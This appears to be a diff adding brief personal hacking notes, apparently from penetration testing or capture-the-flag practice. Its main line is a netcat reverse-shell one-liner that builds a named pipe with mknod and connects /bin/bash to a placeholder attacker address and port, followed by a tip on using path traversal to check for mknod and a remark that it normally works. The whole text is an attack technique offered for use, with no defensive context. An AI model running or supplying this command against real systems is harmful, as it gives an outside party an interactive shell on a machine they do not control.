@@ -1,0 +1,5 @@
+mknod backpipe p && nc <ip> <port> 0<backpipe | /bin/bash 1>backpipe
+
+if doing path traversal you can enter /bin or cat/bin and see if mknod is found on the system
+
+normally works then!!!
